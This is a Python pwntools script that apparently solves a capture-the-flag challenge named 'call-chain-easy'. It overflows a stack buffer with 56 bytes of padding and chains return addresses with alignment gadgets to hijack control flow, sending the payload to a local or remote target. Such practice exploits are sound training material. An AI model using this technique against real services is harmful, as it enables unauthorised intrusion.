#!/usr/bin/env python3

from pwn import *

exe = ELF("./call-chain-easy")

context.binary = exe

gdb_script = """
b *main
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r

ret_gadget = 0x40101a # ret; gadget to align stack
step1 = 0x402491
step2 = 0x40253e
offset = 56 

def main():
    r = conn()

    # good luck pwning :)
    payload = flat(
        b'A' * offset,
        ret_gadget, # stack alignment for x64
        step1,
        ret_gadget, # stack alignment for x64
        step2
    )
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
